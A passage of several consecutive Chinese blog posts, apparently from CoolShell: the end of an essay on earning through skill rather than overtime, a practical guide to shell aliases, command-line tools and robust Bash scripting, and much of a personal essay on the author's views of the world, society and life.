2015年因为父亲病危要动手术，所以我不能工作在家照顾父亲。于是我就成为了一个自由职业者，帮很多公司解决一些技术问题，好多都是高并发和系统稳定性的问题，有一些是分布式架构的运维的问题，还有一些是工程管理和企业文化问题……有一些小公司的单体架构在业务上一推广就宕机了，于是把我叫过去，我在生产线上直接re-arch，用一些非常规的手段，1-2天就把性能救过来了…… 还有就是解决一些点状的技术问题，还帮用户做一些design/code review……，有70%工作是真正的按劳取酬，也就是先把问题解决了再谈要收多少钱，**那段时间我出卖的不是我的劳动力，而是我的技能，所以，反而比打工挣得多多了，而且还比较轻闲**……

有时候，我还调侃到，你在大公司里一天写上万行代码，拼命地加班，你信不信，我只用写几百行代码就挣得比你多？**同样是一个简单的 for-loop 语句，有人写的就值1万元一行，而你写的则一文不值。关键不在于谁写的代码多，关键在于我们解决了什么样的问题**。你千万不要以为只要付你足够的钱，你就可以996，让你干什么都可以，然而当你自己把自己当成劳动力的时候，你也就只是一个像牲口一样的行事了！

![img](photo/hard.work_-1024x576.jpg)

**这就好像算法一样，你那个O(n^2)的递归穷举算法，再怎么样也干不过我的O(n)的动态规划的算法。**

现在我拿了投资在创业，一开始帮助各大企业建高并发高可用云化架构的公司，现在还给企业提供金融和营销能力，我跟客户谈业务的时候，基本不是因为我有多加班多努力地做方案，而是我能一针见血地指出用户的问题，帮用户解决问题。我在很多地方都见到阿里、蚂蚁、华为、HP……，一个小创业公司跟他们竞争真的很难，但我知道，要能竞争过这些大公司，这根本就不是能够通过加班996或是拼命努力就能搞定的，我必需要使用更好的方式，所以，除了更好地站在用户的立场，能够给用户制定更符合用户的技术方案之外，我必需做到我的技术方案不比这些大公司的差，而这一点，完全不是加班、努力或是勤奋能出来的，这是需要靠自己的经验、学习能力、归纳思考、和与更多牛人交流才出的来的……当我给某银行CIO介绍完我的分布式系统的方案后，CIO给我微微鞠躬说：“过去一两年，我听过几乎所有国内外产商跟我讲的分布式的方案，你的是我听过的最好的方案！谢谢你！”，当我给某省电信行业公司讲了一下DevOps的方案后，老总对我说：“你们真的是做事的人！”，当用户来问我：“你们的API网关是怎么写的？为什么运行的这么稳定？”……这些话都是让我很心里很暖的话……**当然，我也有被骂的时候，也有失败的时候，但基本上来说，我无法通过努力工作改善我思维的不足……**

**我们学计算机当程序员最大的福气不是可以到大公司里加班和996，而是我们生活在了第三次工业革命的信息化时代，这才是最大的福气，所以，我们应该努力地提升自己，而不是把自己当劳动力一样的卖了！在这样的一个时代，你要做的不是通过加班和拼命来跪着挣钱，而是通过技能来躺着挣钱……**

（全文完）

# 打造高效的工作环境 – SHELL 篇

#####  [2019年03月17日 ](https://coolshell.cn/articles/19219.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [46 条评论](https://coolshell.cn/articles/19219.html#comments) 132,231 人阅读



> **注：本文由[雷俊](https://github.com/rayjun)(Javaer/Emacser)和我一起编辑，所以文章版权归雷俊与我共同所有，转载者必需注明出处和我们两位作者。原文最早发于酷壳微信公众号，后来我又做了一些修改，再发到博客这边。**

![img](photo/linux.ninja_.png)程序员是一个很懒的群体，总想着能够让代码为自己干活，他们不断地把工作生活中的一些事情用代码自动化了，从而让整个社会的效率运作地越来越高。所以，程序员在准备去优化这个世界的时候，都会先要优化自己的工作环境，是所谓“工欲善其事，必先利其器”。

我们每个程序员都应该打造一套让自己更为高效的工作环境。那怕就是让你少输入一次命令，少按一次键，少在鼠标和键盘间切换一次，都会让程序员的工作变得更为的高效。所以，程序员一般需要一台性能比较好，不会因为开了太多的网页或程序就卡得不行的电脑，还要配备多个显示器，一个显示器写代码，一个查文档，一个测试运行结果，而不必在各种窗口来来回回的切换……在大量的窗口间切换经常会迷路，而且也容易出错（分不清线上或测试环境）……

除了硬件上的装备，软件上也是能够提升程序员生产力的地方，**在软件层面提升程序员生产力的东西有一个很重要的事就是命令行和脚本**，使用鼠标和图形界面则会大大降低程序员的生产力。酷壳以前也写过一些，如《[你可能不知道的Shell](https://coolshell.cn/articles/8619.html)》和《 [应该知道的Linux技巧](https://coolshell.cn/articles/8883.html)》，但是Unix/Linux Shell就是一个大宝库，怎么写也写不完，不然，怎么会有“Where is the Shell, there is a way”。



#### 命令行

在不同的操作系统下，都有着很不错的命令行工具，比如 Mac 下的 **Iterm2**，Linux 下的原生命令行，如果你是在 Windows 下工作，问题也不大，因为 Windows 下现在有了 **WSL**。WSL 提供了一个由微软开发的Linux兼容的内核接口（不包含Linux内核代码），然后可以在其上运行GNU用户空间，例如 Ubuntu，openSUSE，SUSE Linux Enterprise Server，Debian和Kali Linux。这样的用户空间可能包含 Bash shell 和命令语言，使用本机 GNU/Linux 命令行工具（sed，awk 等），编程语言解释器（Ruby，Python 等），甚至是图形应用程序（使用主机端的X窗口系统）。

使用命令行可以完成所有日常的操作，新建文件夹（mkdir）、新建文件（touch）、移动（mv）、复制（cp）、删除（rm）等等。而且使用 Linux/Unix 命令行最好的方式是可以用 `awk`、`sed`、`grep`、`xargs`、`find`、`sort` 等等这样的命令，然后用管道把其串起来，就可以完成一个你想要的功能，尤其是一些简单的数据统计功能。这是Linux命令行不可比拟的优势。比如：

- 查看连接你服务器 top10 用户端的 IP 地址：

```
netstat -nat | awk '{print $5}' | awk -F ':' '{print $1}' | sort | uniq -c | sort -rn | head -n 10
```

- 查看一下你最常用的10个命令：

```
cat .bash_history | sort | uniq -c | sort -rn | head -n 10 (or cat .zhistory | sort | uniq -c | sort -rn | head -n 10
```

（注：`awk` 和 `sed` 是两大神器，所以，我以前的也有两篇文章来介绍它们——《[awk简明教程](https://coolshell.cn/articles/9070.html)》和《[sed简明教程](https://coolshell.cn/articles/9104.html)》，你可以前往一读）

在命令行中使用 **alias** 可以将使用频率很高命令或者比较复杂的命令合并成一个命令，或者修改原生的命令。

下面这几个命令，可能是你天天都在敲的。所以，你应该设置成 alias 来提高效率

```
alias nis="npm install --save "
alias svim='sudo vim'
alias mkcd='foo(){ mkdir -p "$1"; cd "$1" }; foo '
alias install='sudo apt get install'
alias update='sudo apt-get update; sudo apt-get upgrade'
alias ..="cd .."
alias ...="cd ..; cd .."
alias www='python -m SimpleHTTPServer 8000'
alias sock5='ssh -D 8080 -q -C -N -f user@your.server'
```

你还可以参考如下的一些文章，看看别人是怎么用好 `alias` 的

- [30 Handy Bash Shell Aliases For Linux / Unix / Mac OS X](https://www.cyberciti.biz/tips/bash-aliases-mac-centos-linux-unix.html)
- [What are your favorite bash aliases?](https://www.digitalocean.com/community/questions/what-are-your-favorite-bash-aliases)
- [23 Handy Bash Shell Aliases For Unix, Linux, and Mac OS X](https://www.linuxtrainingacademy.com/23-handy-bash-shell-aliases-for-unix-linux-and-mac-os-x/)
- [A few more of my favorite Bash aliases](https://brettterpstra.com/2013/03/31/a-few-more-of-my-favorite-shell-aliases/)

命令行中除了原生的命令之外，还有很多可以提升使用体验的工具。下面罗列一些很不错的命令，把原生的命令增强地很厉害:

- [**fasd**](https://github.com/clvv/fasd) 增强了 `cd` 命令 。
- [**bat**](https://github.com/sharkdp/bat) 增强了 `cat` 命令 。如果你想要有语法高亮的 `cat`，可以试试 [**ccat**](https://github.com/jingweno/ccat) 命令。
- [**exa**](https://github.com/ogham/exa) 增强了 `ls` 命令，如果你需要在很多目录上浏览各种文件 ，[**ranger**](https://github.com/ranger/ranger) 命令可以比 `cd` 和 `cat` 更有效率，甚至可以在你的终端预览图片。
- [**fd**](https://github.com/sharkdp/fd) 是一个比 `find` 更简单更快的命令，他还会自动地忽略掉一些你配置在 `.gitignore` 中的文件，以及 `.git` 下的文件。
- [**fzf**](https://github.com/junegunn/fzf) 会是一个很好用的文件搜索神器，其主要是搜索当前目录以下的文件，还可以使用 `fzf --preview 'cat {}'`边搜索文件边浏览内容。
- `grep` 是一个上古神器，然而，[**ack**](https://beyondgrep.com/)、[**ag**](https://github.com/ggreer/the_silver_searcher) 和 [**rg**](https://github.com/BurntSushi/ripgrep) 是更好的grep，和上面的 `fd`一样，在递归目录匹配的时候，会使用你配置在 `.gitignore` 中的规则。
- `rm` 是一个危险的命令，尤其是各种 `rm -rf …`，所以，[**trash**](https://github.com/andreafrancia/trash-cli/) 是一个更好的删除命令。
- `man` 命令是好读文档的命令，但是man的文档有时候太长了，所以，你可以试试 [**tldr**](https://github.com/tldr-pages/tldr) 命令，把文档上的一些示例整出来给你看。
- 如果你想要一个图示化的`ping`，你可以试试 [**prettyping**](https://github.com/denilsonsa/prettyping) 。
- 如果你想搜索以前打过的命令，不要再用 Ctrl +R 了，你可以使用加强版的 [**hstr**](https://github.com/dvorka/hstr) 。
- [**htop**](https://hisham.hm/htop/) 是 top 的一个加强版。然而，还有很多的各式各样的top，比如：用于看IO负载的 [**iotop**](http://guichaz.free.fr/iotop/)，网络负载的 [**iftop**](http://www.ex-parrot.com/~pdw/iftop/), 以及把这些top都集成在一起的 [**atop**](https://github.com/Atoptool/atop)。
- [**ncdu**](https://dev.yorhel.nl/ncdu) 比 du 好用多了用。另一个选择是 [nnn](https://github.com/jarun/nnn)。
- 如果你想把你的命令行操作建录制成一个 SVG 动图，那么你可以尝试使用 [**asciinema**](https://asciinema.org/) 和 [**svg-trem**](https://github.com/marionebl/svg-term-cli) 。
- [**httpie**](https://github.com/jakubroztocil/httpie) 是一个可以用来替代 `curl` 和 `wget` 的 http 客户端，`httpie` 支持 json 和语法高亮，可以使用简单的语法进行 http 访问: `http -v github.com`。
- [**tmux**](https://github.com/tmux/tmux) 在需要经常登录远程服务器工作的时候会很有用，可以保持远程登录的会话，还可以在一个窗口中查看多个 shell 的状态。
- [**Taskbook**](https://github.com/klaussinani/taskbook) 是可以完全在命令行中使用的任务管理器 ，支持 ToDo 管理，还可以为每个任务加上优先级。
- [**sshrc**](https://github.com/Russell91/sshrc) 是个神器，在你登录远程服务器的时候也能使用本机的 shell 的 rc 文件中的配置。
- [**goaccess**](https://github.com/allinurl/goaccess) 这个是一个轻量级的分析统计日志文件的工具，主要是分析各种各样的 access log。

关于这些增加命令，主要是参考自下面的这些文章

1. [10 Tools To Power Up Your Command Line](https://dev.to/_darrenburns/10-tools-to-power-up-your-command-line-4id4)
2. [5 More Tools To Power Up Your Command Line (Part 2 Of Series)](https://dev.to/_darrenburns/tools-to-power-up-your-command-line-part-2-2737)
3. [Power Up Your Command Line, Part 3](https://dev.to/_darrenburns/power-up-your-command-line-part-3-4o53)
4. [Power Up Your Command Line](https://darrenburns.net/posts/tools/)
5. [Hacker Tools](https://hacker-tools.github.io/)

#### Shell 和脚本

shell 是可以与计算机进行高效交互的文本接口。shell 提供了一套交互式的编程语言（脚本），shell的种类很多，比如 **sh**、**bash**、**zsh** 等。

shell 的生命力很强，在各种高级编程语言大行其道的今天，很多的任务依然离不开 shell。比如可以使用 shell 来执行一些编译任务，或者做一些批处理任务，初始化数据、打包程序等等。

现在比较流行的是 **zsh** + [**oh-my-zsh**](https://ohmyz.sh/) + [**zsh-autosuggestions**](https://github.com/zsh-users/zsh-autosuggestions) 的组合，你也可以试试看。其中 zsh 和 oh-my-zsh 算是常规操作了，但是 zsh-autosuggestions 特别有用，可以超级快速的帮你补全你输入过的命令，让命令行的操作更加高效。

另外，**[fish](https://fishshell.com/)** 也是另外一个牛逼的shell，比如：命令行自动完成（根据历史记录），命令行命令高亮，当你要输入命令行参数的时候，自动提示有哪些参数…… fish在很多地方也是用起来很爽的。和上面的 oh-my-zsh 有点不分伯仲了。

你也许会说，用 Python 脚本或 PHP 来写脚本会比 Shell 更好更没有 bug，但我要申辩一下:

- 其一，如果你有一天要维护线上机器的时候，或是到了银行用户的系统（与外网完全隔离，而且服务器上没有安装 Python/PHP 或是他们的的高级库，那么，你只有 Shell 可以用了）。
- 其二，而且，如果要跟命令行交互很多的话，Shell 是不二之选，试想一下，如果你要去 100 台远程的机器上查access.log 日志中有没有某个错误，完成这个工作你是用 PHP/Python 写脚本快还是用 Shell 写脚本快呢？

所以，**我们还要学会只使用传统的grep/awk/sed等等这些POSIX的原生的系统默认安装的命令**。

当然，要写好一个脚本并不容易，下面有一些小模板供你参考：

处理命令行参数的一个样例

```
while [ "$1" != "" ]; do
    case $1 in
        -s  )   shift	
		SERVER=$1 ;;  
        -d  )   shift
		DATE=$1 ;;
	--paramter|p ) shift
		PARAMETER=$1;;
        -h|help  )   usage # function call
                exit ;;
        * )     usage # All other parameters
                exit 1
    esac
    shift
done 
```

命令行菜单的一个样例

```
#!/bin/bash
# Bash Menu Script Example

PS3='Please enter your choice: '
options=("Option 1" "Option 2" "Option 3" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Option 1")
            echo "you chose choice 1"
            ;;
        "Option 2")
            echo "you chose choice 2"
            ;;
        "Option 3")
            echo "you chose choice $REPLY which is $opt"
            ;;
        "Quit")
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done
```

颜色定义，你可以使用 `echo -e "${Blu}blue ${Red}red ${RCol}etc...."` 进行有颜色文本的输出

```
RCol='\e[0m'    # Text Reset

# Regular           Bold                Underline           High Intensity      BoldHigh Intens     Background          High Intensity Backgrounds
Bla='\e[0;30m';     BBla='\e[1;30m';    UBla='\e[4;30m';    IBla='\e[0;90m';    BIBla='\e[1;90m';   On_Bla='\e[40m';    On_IBla='\e[0;100m';
Red='\e[0;31m';     BRed='\e[1;31m';    URed='\e[4;31m';    IRed='\e[0;91m';    BIRed='\e[1;91m';   On_Red='\e[41m';    On_IRed='\e[0;101m';
Gre='\e[0;32m';     BGre='\e[1;32m';    UGre='\e[4;32m';    IGre='\e[0;92m';    BIGre='\e[1;92m';   On_Gre='\e[42m';    On_IGre='\e[0;102m';
Yel='\e[0;33m';     BYel='\e[1;33m';    UYel='\e[4;33m';    IYel='\e[0;93m';    BIYel='\e[1;93m';   On_Yel='\e[43m';    On_IYel='\e[0;103m';
Blu='\e[0;34m';     BBlu='\e[1;34m';    UBlu='\e[4;34m';    IBlu='\e[0;94m';    BIBlu='\e[1;94m';   On_Blu='\e[44m';    On_IBlu='\e[0;104m';
Pur='\e[0;35m';     BPur='\e[1;35m';    UPur='\e[4;35m';    IPur='\e[0;95m';    BIPur='\e[1;95m';   On_Pur='\e[45m';    On_IPur='\e[0;105m';
Cya='\e[0;36m';     BCya='\e[1;36m';    UCya='\e[4;36m';    ICya='\e[0;96m';    BICya='\e[1;96m';   On_Cya='\e[46m';    On_ICya='\e[0;106m';
Whi='\e[0;37m';     BWhi='\e[1;37m';    UWhi='\e[4;37m';    IWhi='\e[0;97m';    BIWhi='\e[1;97m';   On_Whi='\e[47m';    On_IWhi='\e[0;107m';
```

取当前运行脚本绝对路径的示例：（注：Linux下可以用 `dirname $(readlink -f $0)` ）

```
FILE="$0"
while [[ -h ${FILE} ]]; do
    FILE="`readlink "${FILE}"`"
done
pushd "`dirname "${FILE}"`" > /dev/null
DIR=`pwd -P`
popd > /dev/null
```

如何在远程服务器运行一个本地脚本

```
#无参数
ssh user@server 'bash -s' < local.script.sh

#有参数
ssh user@server ARG1="arg1" ARG2="arg2" 'bash -s' < local_script.sh
```

如何检查一个命令是否存在，用 `which` 吗？最好不要用，因为很多操作系统的 `which` 命令没有设置退出状态码，这样你不知道是否是有那个命令。所以，你应该使用下面的方式。

```
# POSIX 兼容:
command -v [the_command]

# bash 环境:
hash [the_command]
type [the_command]

# 示例：
gnudate() {
    if hash gdate 2> /dev/null; then
        gdate "$@"
    else
        date "$@"
    fi
}
```

然后，如果要写出健壮性更好的脚本，下面是一些相关的技巧：

- 使用 `-e` 参数，如：`set -e` 或是 `#!/bin/sh -e`，这样设置会让你的脚本出错就会停止运行，这样一来可以防止你的脚本在出错的情况下还在拼拿地干活停不下来。
- 使用 `-u` 参数，如： `set -eu`，这意味着，如果你代码中有变量没有定义，就会退出。
- 对一些变理，你可以使用默认值。如：`${FOO:-'default'}`
- 处理你代码的退出码。这样方便你的脚本跟别的命令行或脚本集成。
- 尽量不要使用 `;` 来执行多个命令，而是使用 `&&`，这样会在出错的时候停止运行后续的命令。
- 对于一些字符串变量，使用引号括起，避免其中有空格或是别的什么诡异字符。
- 如果你的脚有参数，你需要检查脚本运行是否带了你想要的参数，或是，你的脚本可以在没有参数的情况下安全的运行。
- 为你的脚本设置 `-h` 和 `--help` 来显示帮助信息。千万不要把这两个参数用做为的功能。
- 使用 `$()` 而不是 ``来获得命令行的输出，主要原因是易读。
- 小心不同的平台，尤其是 MacOS 和 Linux 的跨平台。
- 对于 `rm -rf` 这样的高危操作，需要检查后面的变量名是否为空，比如：`rm -rf $MYDIDR/*` 如果 `$MYDIR`为空，结果是灾难性的。
- 考虑使用 “find/while” 而不是 “for/find”。如：`for F in $(find . -type f) ; do echo $F; done` 写成 `find . -type f | while read F ; do echo $F ; done` 不但可以容忍空格，而且还更快。
- 防御式编程，在正式执行命令前，把相关的东西都检查好，比如，文件目录有没有存在。

你还可以使用ShellCheck 来帮助你检查你的脚本。

- https://www.shellcheck.net/

最后推荐一些 Shell 和脚本的参考资料。

各种有意思的命令拼装，一行命令走天涯:

- http://www.bashoneliners.com/
- http://www.shell-fu.org/
- http://www.commandlinefu.com/

下面是一些脚本集中营，你可以在里面淘到各种牛X的脚本：

- http://www.shelldorado.com/scripts/
- https://snippets.siftie.com/public/tag/bash/
- https://bash.cyberciti.biz/
- https://github.com/alexanderepstein/Bash-Snippets
- https://github.com/miguelgfierro/scripts
- https://github.com/epety/100-shell-script-examples
- https://github.com/ruanyf/simple-bash-scripts

甚至写脚本都可以使用框架:

- 写bash脚本的框架 https://github.com/Bash-it/bash-it

Google的Shell脚本的代码规范：

- https://google.github.io/styleguide/shell.xml

最后，别忘了几个和shell有关的索引资源：

- https://github.com/alebcay/awesome-shell
- https://github.com/awesome-lists/awesome-bash
- https://terminalsare.sexy/

最后，如果你还有什么别的更好的玩的东西，欢迎在评论区留言，或是到 [coolshellx/ariticles @ github](https://github.com/coolshellx/articles) 修改本文。

（全文完）

# 谈谈我的“三观”

#####  [2019年02月26日 ](https://coolshell.cn/articles/19085.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [151 条评论](https://coolshell.cn/articles/19085.html#comments) 171,452 人阅读

![img](photo/cross.road_-300x200.jpg)也许是人到了四十多了，敢写这么大的命题，我也醉了，不过，我还是想把我的想法记录下来，算是对我思考的一个snapshot，给未来的我看看，要么被未来的我打脸，要么打未来我的脸。无论怎么样，我觉得对我自己都很有意义。注意，这篇文章是长篇大论。

三观是世界观、人生观和价值观，

- **世界观代表你是怎么看这个世界的。**是左还是右，是激进还是保守，是理想还是现实，是乐观还是悲观……
- **人生观代表你要想成为什么样的人。**是成为有钱人，还是成为人生的体验者，是成为老师，还是成为行业专家，是成为有思想的人，还是成为有创造力的人……
- **价值观则是你觉得什么对你来说更重要**。是名是利，是过程还是结果，是付出还是索取，是国家还是自己，是家庭还是职业……

人的三观其实是会变的，回顾一下我的过去，我感觉我的三观至少有这么几比较明显的变化，学生时代、刚走上社会的年轻时代，三十岁后的时代，还有现在。估计人都差不多吧……

- 学生时代的三观更多的是学校给的，用各种标准答案给的，是又红又专的
- 刚走上社会后发现完全不是这么一回事，但学生时代的三观根深蒂固，三观开始分裂，内心开始挣扎
- 三十岁后，不如意的事越来越多，对社会越来越了解，有些人屈从现实，有些人不服输继续奋斗，而有些人展露才能开始影响社会，而分裂的三观开始收敛，我属于还在继续奋斗的人。
- 四十岁时，经历过的事太多，发现留给自己的时间不多，世界太复杂，而还有好多事没做，从而变得与世无争，也变得更为地自我。



目录



[面对世界](https://coolshell.cn/articles/19085.html#面对世界)[面对社会](https://coolshell.cn/articles/19085.html#面对社会)[面对人生](https://coolshell.cn/articles/19085.html#面对人生)[价值取向](https://coolshell.cn/articles/19085.html#价值取向)

#### 面对世界

年轻的时候，抵制过日货，虽然没上过街，但是也激动过，一次是1999南斯拉夫大使馆被炸，一次是2005反日示威，以前，我也是一个爱国愤青。但是后来，有过各种机会出国长时间生活工作，加拿大、英国、美国、日本……随着自己的经历和眼界的开阔，自己的三观自己也随着有了很多的变化，发现有些事并不是自己一开始所认识的那样，而且还是截然相反的。**我深深感觉到，要有一个好的世界观，你需要亲身去经历和体会这个世界，而不是听别人说**。所以，当我看到身边的人情绪激动地要抵制这个国家，搞死那个民族的时候，我都会建议他去趟那个国家最好在在那个国家呆上一段时间，亲自感受一下。

再后来发现，要抵制的越来越多，小时候的美英帝国主义，然后是日本，再后面是法国、韩国、菲利宾、印度、德国、瑞典、加拿大……从小时候的台独到现在的港独、藏独、疆独……发现再这样下去，基本上来说，自己的人生也不用干别的事了……另外，随着自己的成长，越来越明白，**抵制这个抵制那个只不过是幼稚和狭隘的爱国主义，真想强国，想别让他人看得起，就应该把时间和精力放在努力学习放在精益求精上，做出比他们更好的东西来。**另外，感觉用对内的爱国主义解决对外的外交问题也有点驴唇不对马嘴，无非也就是转移一下内部的注意力罢了，另外还发现爱国主义还可以成为消费营销手段……**不是我不爱国，是我觉得世道变复杂了，我只是一个普通的老百姓，能力有限，请不要赋予我那么大的使命，我只想在我的专业上精进，能力所能及地帮助身边的人，过一个简单纯粹安静友善的生活**……

另外，为什么国与国之间硬要比个你高我低，硬要分个高下，硬要争出个输赢，我也不是太理解，世界都已经发展到全球化的阶段了，很多产品早就是你中有我，我中有你的情况了。举个例子，一部手机中的元件，可能来自全世界数十个国家，我们已经说不清楚一部手机是究竟是哪个国家生产的了。即然，整个世界都在以一种合作共赢全球化的姿态下运作，认准自己的位置，拥抱世界，持续向先进国家学习，互惠互利，不好吗？你可能会说，不是我们不想这样，是别人不容我们发展……**老实说，大的层面我也感受不到，但就我在的互联网计算机行业方面，我觉得整个世界的开放性越来越好，开源项目空前地繁荣，世界上互联网文化也空前的开放，在计算机和互联网行业，我们享受了太多的开源和开放的红利，人家不开放，我们可能在很多领域还落后数十年。然而现在很多资源我们都访问不了，用个VPN也非法，你说是谁阻碍了发展？我只想能够流畅地访问互联网，让我的工作能够更有效率，然而，我在自己的家里却像做贼一样去学习新知识新技术，随时都有可能被抓进监狱……**

随着自己的经历越多，发现这个世界越复杂，也发现自己越渺小，很多国家大事并不是我不关心，是我觉得那根本不是我这个平头老百姓可以操心的事，这个世界有这个世界运作的规律和方法，而还有很多事情超出了我能理解的范围，也超出了我能控制的范围，我关心不关心都一个样，这些大事都不会由我的意志所决定的。而所谓的关心，无非就是喊喊口号，跟人争论一下，试图改变其它老百姓的想法，然而，对事情的本身的帮助却没有多大意义。过上几天，生活照旧，人家该搞你还不是继续搞你，而你自己并不因为做这些事而过得更好。

**我对国与国之间的关系的态度是，有礼有节，不卑不亢，对待外国人，有礼貌但也要有节气，既不卑躬屈膝，也不趾高气昂**，整体上，我并不觉得我们比国外有多差，但我也不觉得我们比国外有多好，我们还在成长，还需要帮助和协作，四海之内皆兄弟，无论在哪个国家，在老百姓的世界里，哪有那么多矛盾。**有机会多出去走走，多结交几个其它民族的朋友，你会觉得，在友善和包容的环境下，你的心情和生活可以更好**。

我现在更多关心的是和我生活相关的东西，比如：上网、教育、医疗、食品、治安、税务、旅游、收入、物价、个人权益、个人隐私……这些东西对我的影响会更大一些，也更值得关注，可以看到过去的几十年，我们国家已经有了长足的进步，这点也让我让感到很开心和自豪的，在一些地方也不输别人。但是，依然有好些事的仍然没有达到我的预期，而且还很糟糕，这个也要承认。而对，未来的变数谁也不好说，我在这个国度里的安全感似乎还不足够，所以，我还是要继续努力，以便我可以有更多的选项。有选项总比没得选要好。所以，**我想尽一切办法，努力让选项多起来，无法改变无法影响，那就只能提高自己有可选择的可能性**。

#### 面对社会

另外，在网上与别人对一些事或观点的争论，我觉得越来越无聊，以前被怼了，一定要怼回去，现在不会了，视而不见，不是怕了，是因为，网络上的争论在我看来大多数都是些没有章法，逻辑混乱的争论。

- 很多讨论不是说事，直接就是怼人骂人。随意就给人扣个帽子。
- 非黑即白的划分，你说这个不是黑的，他们就把你划到白的那边。
- 飘移观点，复杂化问题。东拉西扯，牵强附会，还扯出其它不相关的事来混淆。
- 杠精很多，不关心你的整体观点，抓住一个小辫子大作文章。

很明显，**与其花时间教育这些人，不如花时间提升自己，让自己变得更优秀，这样就有更高的可能性去接触更聪明更成功更高层次的人**。因为，一方面，你改变不了他们，另外，改变他们对你自己也没什么意义，改变自己，提升自己，让自己成长才有意义。时间是宝贵的，那些人根本不值得花时间，应该花时间去结交更有素质更聪明的人，做更有价值的事。

美国总统富兰克林·罗斯福妻子埃莉诺·罗斯福（Eleanor Roosevelt）说过下面的一句话。

> **Great minds discuss ideas;
> Average minds discuss events;
> Small minds discuss people**

把时间多放在一些想法上，对自己对社会都是有意义的，把时间放在八卦别人，说长到短，你也不可能改善自己的生活，**你批评这个批评那个，看不上这个看不起那个，不会让你有成长，也不会提升你的影响力，你的影响力不是你对别人说长道短的能力，而是别人信赖你并希望得到你的帮助的现象**。多交一些有想法的朋友，多把自己的想法付诸实践，那怕没有成功，你的人生也会比别人过得有意义。

如果你看过我以前的文章，你会看到一些吐槽性质的文章，而后面就再也没有了。另外，我也不再没有针对具体的某个人做出评价，因为人太复杂的了，经历的越多，你就会发现你很难评价人，与其花时间在评论人和事上，不如把时间花在做一些力所能及的事来改善自己或身边的环境。所以，**我建议大家少一些对人的指责和批评，通过对一件事来引发你的思考，想一想有什么可以改善，有什么方法可以做得更好，有哪些是自己可以添砖加瓦的？你会发现，只要你坚持这么做，你个人的提升和对社会的价值会越来越大，而你的影响力也会越来越大**。

#### 面对人生

现在的我，即不是左派也不是右派，我不喜欢爱国主义，我也不喜欢崇洋媚外，我更多的时候是一个自由派，哪边我都不站，我站我自己。因为，生活在这样的一个时代，能让自己过好都是一些比较奢望的事了。

《教父》里有这样的人生观：**第一步要努力实现自我价值，第二步要全力照顾好家人，第三步要尽可能帮助善良的人，第四步为族群发声，第五步为国家争荣誉。事实上作为男人，前两步成功，人生已算得上圆满，做到第三步堪称伟大，而随意颠倒次序的那些人，一般不值得信任**。这也是古人的“修身齐家治国平天下”！所以，在你我准备要开始要“平天下”的时候，也得先想想，自己的生活有没有过好了，家人照顾好了么，身边有哪些力所能及的事是可以去改善的……

穷则独善其身，达则兼济天下。提升自己，实现自我，照顾好自己的家人，帮助身边的人。这已经很不错了！

什么样的人干什么样的事，什么样的阶段做什么样的选择，**有人的说，选择比努力更重要的，我深以为然，而且，我觉得选择和决定，比努力更难**，努力是认准了一个事后不停地发力，而决定要去认准哪个事是自己该坚持努力的，则是令人彷徨和焦虑的（半途而废的人也很多）。面对人生，你每天都在作一个一个的决定，在做一个又一个的选择，有的决定大，有的决定小，你的人生的轨迹就是被这一个一个的决定和选择所走走出来的。

我在24岁放弃了一房子离开银行到小公司的时候，我就知道，人生的选择就是一个翘翘板，你要一头就没有另一头，**选择是有代价的，你不选择的代价更大；选择是要冒险的，你不敢冒险的风险更大；选择是需要放弃的，因为无论怎么选你都会要放弃。想想你老了以后，回头一看，好多事情在年轻的时候都不敢做，而你再也没有机会，你就知道不敢选择不敢冒险的代价有多大了。**选择就是一种 trade-off，这世上根本不会有什么完美，只要你想做事，你有雄心壮志，你的人生就是一个坑接着一个坑，你所能做的就是找到你喜欢的方向跳坑。

所以， 你要想清楚你要什么，不要什么，而且还不能要得太多，这样你才好做选择。否则，你影响你的因子太多，决定不好做，也做不好。

就像最前面说的一样，你是激进派还是保守派，你是喜欢领导还是喜欢跟从，你是注重长期还是注重短期，你是注重过程还是注重结果……等等，你对这些东西的坚持和守护，成为了你的“三观”，而你的三观则影响着你的选择，而你的选择影响着你的人生。

#### 价值取向

下面是一些大家经常在说，可能也是大多数人关心的问题，就这些问题，我也谈谈我的价值取向。

**挣钱**。挣钱是一个大家都想做的事，但你得解决一个很核心的问题，那就是为什么别人愿意给你钱？对于挣钱的价值观从我大学毕业到现我就没怎么变过，那就是我更多关注的是怎么提高自己的能力，让自己值那个价钱，让别人愿意付钱。另外一方面，我发现，**越是有能力的人，就越不计较一些短期得失，越计较短期得失的人往往都是很平庸的人**。有能力的人不会关心自己的年终奖得拿多少，会不会晋升，他们更多的关心自己真正的实力有没有超过更多的人，更多的关注的是自己长远的成长，而不是一时的利益。聪明的人从来不关心眼前的得失，不会关心表面上的东西，他们更多关心的是长期利益，关心长期利益的人一定不是投机者，一定是投资者，**投资会把自己的时间精力金钱投资在能让自己成长和提升的地方，那些让自己可以操更大的盘的地方，他们培养自己的领导力和影响力。**而投机者在职场上会通过溜须拍马讨好领导，在学习上追求速成，在投资上使用跟随策略，在创业上甚至会不择手段，当风险来临时，投机者是几乎完全没有抗风险能力的，他们所谓的能力只不过因为形势好。

 

**技术**。对于计算机技术来说，要学的东西实在是太多，我并不害怕要学的东西很多，因为学习能力是一个好的工程师必需具备的事，我不惧怕困难和挑战。我觉得在语言和技术争论谁好谁坏是一种幼稚的表现， 没有完美的技术，Engineering 玩的是 Tradeoff。所以，我对没有完美的技术并不担心，但是我反而担心的是，当我们进入到一些公司后，这些公司会有一些技术上的沉淀也就是针对公司自己的专用技术，比如一些中间件，一些编程框架，lib库什么的。老实说，我比较害怕公司的专用技术，因为一旦失业，我建立在这些专用技术上的技能也会随之瓦解，有时候，我甚至害怕把我的技术建立在某一个平台上，小众的不用说了，大众的我也比较担扰，比如Windows或Unix/Linux上，因为一旦这个平台不流行或是被取代，那么我也会随之淘汰（过去的这20年已经发生过太多这样的事了）。为了应对这样的焦虑，**我更愿意花时间在技术的原理和技术的本质上，这导致我需要了解各种各样的技术的设计方法，以及内在原理。**所以，当国内的绝大多数程序员们更多的关注架构性能的今天，我则花更多的时间去了解编程范式，代码重构，软件设计，计算机系统原理，领域设计，工程方法……因为只有原理、本质和设计思想才可能让我不会被绑在某个专用技术或平台上，除非，我们人类的计算机这条路没走对。

 

